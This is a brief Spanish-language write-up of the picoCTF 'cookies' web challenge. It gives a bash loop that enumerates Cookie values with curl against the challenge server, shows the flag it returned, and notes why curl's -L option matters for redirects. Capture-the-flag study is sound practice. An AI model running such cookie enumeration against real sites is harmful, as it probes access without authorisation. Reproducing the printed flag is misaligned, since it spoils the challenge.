## Descripción
Who doesn't love cookies? Try to figure out the best one.

http://wily-courier.picoctf.net:57608/
## Solución
```
for i in {0..30}; do curl -s -L http://wily-courier.picoctf.net:57608/ -H "Cookie: name=$i" | grep "picoCTF{"; done
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
            
            
2. for i in {0..30}; do curl -s http://wily-courier.picoctf.net:57608/check -H "Cookie: name=$i" | grep "picoCTF{"; done
```
Al parecer testeando en la pagina con un editor de cookies podias ver que salian diferentes textos para el numero de cookie, pero no sabiamos cual numero de cookie era la que tenia la bandera, entonces usamos un for para pasar a travez de los numeros posibles de cookies y buscamos con grep la bandera, pero al parecer.

Segun la ia El servidor del reto suele hacer una redirección HTTP (302) cuando le envías una cookie válida. Si no le indicas a `curl` que siga esa redirección, solo descarga el HTML de redirección (que no tiene la bandera).

Agrega el parámetro **`-L`** (Location) a `curl` para que siga las redirecciones

No se utiliza el -L cuando tienes el url de cuando una cookie esta correcta 
## Notas adicionales

## Referencias
